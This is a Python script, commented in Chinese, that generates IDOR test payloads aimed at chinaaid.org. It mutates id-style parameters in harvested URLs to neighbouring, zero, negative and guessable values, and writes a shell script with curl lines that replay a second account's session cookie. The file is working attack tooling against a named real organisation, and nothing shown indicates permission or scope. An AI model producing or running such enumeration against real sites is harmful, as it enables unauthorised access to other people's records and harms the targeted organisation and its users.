#!/usr/bin/env python3
"""
IDOR专用payload生成器
为chinaaid.org的2,212个id参数生成测试用例
"""

import urllib.parse
from pathlib import Path
import re

def extract_id_value(url):
    """从URL中提取id参数值"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    for key in ['id', 'uid', 'user_id', 'userid', 'account_id', 'member_id']:
        if key in params:
            return key, params[key][0]
    
    return None, None

def generate_idor_variations(base_url, param_name, original_value):
    """生成IDOR测试变体"""
    results = []
    parsed = urllib.parse.urlparse(base_url)
    query_params = urllib.parse.parse_qs(parsed.query)
    
    # 测试值集合
    test_values = []
    
    if original_value.isdigit():
        original_int = int(original_value)
        test_values = [
            str(original_int + 1),  # 递增
            str(original_int - 1),  # 递减
            str(original_int + 10), # 跳跃
            "1",                    # 第一个
            "0",                    # 零值
            "-1",                   # 负值
            "999999",               # 大值
        ]
    else:
        # 非数字ID
        test_values = [
            "admin",
            "test",
            "1",
            "user1",
        ]
    
    for test_value in test_values:
        new_query = []
        for key, values in query_params.items():
            if key == param_name:
                new_query.append(f"{key}={test_value}")
            else:
                for val in values:
                    new_query.append(f"{key}={val}")
        
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(new_query)}"
        results.append({
            'url': new_url,
            'param': param_name,
            'original': original_value,
            'test': test_value,
            'method': 'GET'
        })
    
    return results

def main():
    target = "chinaaid.org"
    input_file = Path(f"hunt_targets/{target}/id_param_top20.txt")
    output_dir = Path(f"hunt_targets/{target}/payloads")
    output_dir.mkdir(exist_ok=True, parents=True)
    
    print(f"=== IDOR Payload生成器 - {target} ===\n")
    
    if not input_file.exists():
        print(f"❌ 输入文件不存在: {input_file}")
        return
    
    urls = input_file.read_text().strip().split('\n')
    all_test_cases = []
    
    print(f"处理 {len(urls)} 个URL...\n")
    
    for i, url in enumerate(urls, 1):
        if not url.strip():
            continue
        
        param_name, original_value = extract_id_value(url.strip())
        
        if param_name and original_value:
            test_cases = generate_idor_variations(url.strip(), param_name, original_value)
            all_test_cases.extend(test_cases)
            
            if i <= 3:  # 显示前3个示例
                print(f"{i}. {param_name}={original_value}")
                print(f"   原始: {url.strip()}")
                print(f"   测试: {test_cases[0]['url']}")
                print()
    
    # 保存详细测试用例
    output_file = output_dir / "idor_test_cases_detailed.txt"
    with open(output_file, 'w') as f:
        f.write("# IDOR Test Cases for chinaaid.org\n")
        f.write("# Format: URL | Param | Original | Test | Method\n\n")
        for tc in all_test_cases:
            f.write(f"{tc['url']} | {tc['param']} | {tc['original']} -> {tc['test']} | {tc['method']}\n")
    
    # 保存简化URL列表
    simple_output = output_dir / "idor_urls_simple.txt"
    with open(simple_output, 'w') as f:
        for tc in all_test_cases:
            f.write(f"{tc['url']}\n")
    
    # 生成测试脚本
    script_file = output_dir / "test_idor.sh"
    with open(script_file, 'w') as f:
        f.write("#!/bin/bash\n")
        f.write("# IDOR测试脚本\n\n")
        f.write("echo '=== IDOR测试 - chinaaid.org ==='\n")
        f.write("echo ''\n")
        f.write("echo '注意: 需要2个测试账户'\n")
        f.write("echo '1. 使用账户A登录，记录响应'\n")
        f.write("echo '2. 使用账户B登录，尝试访问账户A的资源'\n")
        f.write("echo '3. 比较响应差异'\n")
        f.write("echo ''\n\n")
        f.write("# 示例: 测试前5个URL\n")
        for i, tc in enumerate(all_test_cases[:5], 1):
            f.write(f"# Test {i}: {tc['param']}={tc['original']} -> {tc['test']}\n")
            f.write(f"# curl -H 'Cookie: session=USER_B' '{tc['url']}'\n\n")
    
    script_file.chmod(0o755)
    
    print(f"✅ 生成完成")
    print(f"   总测试用例: {len(all_test_cases)}")
    print(f"   详细用例: {output_file}")
    print(f"   简化URL: {simple_output}")
    print(f"   测试脚本: {script_file}")
    print()
    print(f"下一步: 使用2个测试账户执行IDOR测试")

if __name__ == '__main__':
    main()
